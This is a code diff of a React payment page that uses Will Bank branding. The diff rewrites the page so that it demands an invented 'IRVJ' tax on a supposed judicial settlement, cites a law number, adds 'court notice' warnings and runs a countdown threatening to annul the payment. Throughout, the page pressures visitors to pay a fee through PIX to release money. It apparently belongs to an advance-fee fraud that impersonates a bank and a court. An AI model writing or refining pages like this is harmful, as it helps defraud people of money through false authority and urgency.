@@ -304,7 +304,7 @@ const Saque = () => {
     <div className="min-h-screen min-h-[100dvh] bg-background flex flex-col">
       <WillBankHeader 
         userName={cpfData.nome.split(' ')[0].toUpperCase()} 
-        breadcrumb="Benefício > Indenização > Pagamento"
+        breadcrumb="Liquidação Judicial > Ordem de Pagamento > IRVJ"
       />
 
       <main className="flex-1 flex items-center justify-center p-3 sm:p-6">
@@ -326,7 +326,7 @@ const Saque = () => {
               {/* Header */}
               <div className="text-center space-y-2">
                 <img src={willbankLogo} alt="Will Bank" className="h-10 sm:h-12 mx-auto" />
-                <h1 className="text-lg sm:text-xl font-bold tracking-tight">Pagamento do Imposto de Transferência</h1>
+                <h1 className="text-lg sm:text-xl font-bold tracking-tight">IRVJ - Imposto sobre Recebimento de Valores Judiciais</h1>
               </div>
 
               {/* Countdown */}
@@ -336,17 +336,17 @@ const Saque = () => {
                   <span className="font-semibold text-sm">Tempo restante:</span>
                 </div>
                 <p className="text-3xl sm:text-4xl font-black text-red-600 font-mono mt-2 tracking-tight">{formatTime(countdown)}</p>
-                <p className="text-[10px] sm:text-xs text-red-500 mt-1.5 font-medium">Após este prazo, sua indenização será cancelada</p>
+                <p className="text-[10px] sm:text-xs text-red-500 mt-1.5 font-medium">AVISO DO TRIBUNAL: Após este prazo, sua ordem de pagamento será ANULADA</p>
               </div>
 
               {/* Values Summary */}
               <div className="bg-muted/50 rounded-xl sm:rounded-2xl p-4 space-y-3 border border-border/40">
                 <div className="flex justify-between items-center">
-                  <span className="text-muted-foreground font-medium text-sm">Indenização a receber:</span>
+                  <span className="text-muted-foreground font-medium text-sm">Valor da Liquidação Judicial:</span>
                   <span className="font-black text-base sm:text-lg text-success">R$ {valorBeneficio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</span>
                 </div>
                 <div className="flex justify-between items-center border-t border-border/40 pt-3">
-                  <span className="text-muted-foreground font-medium text-sm">Imposto a pagar:</span>
+                  <span className="text-muted-foreground font-medium text-sm">IRVJ (Lei 14.302):</span>
                   <span className="font-black text-base sm:text-lg text-primary">R$ {taxaFinal.toFixed(2).replace('.', ',')}</span>
                 </div>
                 {protocolo && (
@@ -364,7 +364,7 @@ const Saque = () => {
                   disabled={!pixData}
                   className="w-full h-14 text-sm sm:text-base font-black bg-gradient-to-r from-primary to-amber-400 hover:from-primary/90 hover:to-amber-400/90 text-primary-foreground rounded-full shadow-xl hover:shadow-2xl transition-all duration-300"
                 >
-                  Pagar agora e liberar indenização
+                  PAGAR IRVJ E LIBERAR ORDEM DE PAGAMENTO
                 </Button>
               ) : (
                 <div className="space-y-4 animate-fade-in">
@@ -405,7 +405,7 @@ const Saque = () => {
                         Verificando pagamento...
                       </>
                     ) : (
-                      "Já paguei, liberar minha indenização"
+                      "JÁ PAGUEI - PROCESSAR MINHA ORDEM DE PAGAMENTO"
                     )}
                   </Button>
                 </div>
@@ -414,7 +414,7 @@ const Saque = () => {
               {/* Dev Test Button - only visible in development */}
 
               <p className="text-[10px] sm:text-xs text-center text-muted-foreground font-medium">
-                Após a confirmação do pagamento, sua indenização será liberada em até 24h úteis.
+                Após confirmação do IRVJ, o Tribunal autorizará a transferência em até 24h úteis.
               </p>
             </div>
           ) : (
@@ -425,9 +425,9 @@ const Saque = () => {
               </div>
               
               <div className="space-y-1.5">
-                <h1 className="text-xl sm:text-2xl font-bold tracking-tight">Pagamento Confirmado!</h1>
+                <h1 className="text-xl sm:text-2xl font-bold tracking-tight">IRVJ RECOLHIDO COM SUCESSO</h1>
                 <p className="text-muted-foreground text-sm">
-                  Sua indenização está sendo processada.
+                  O Tribunal está processando sua ordem de pagamento.
                 </p>
               </div>
 
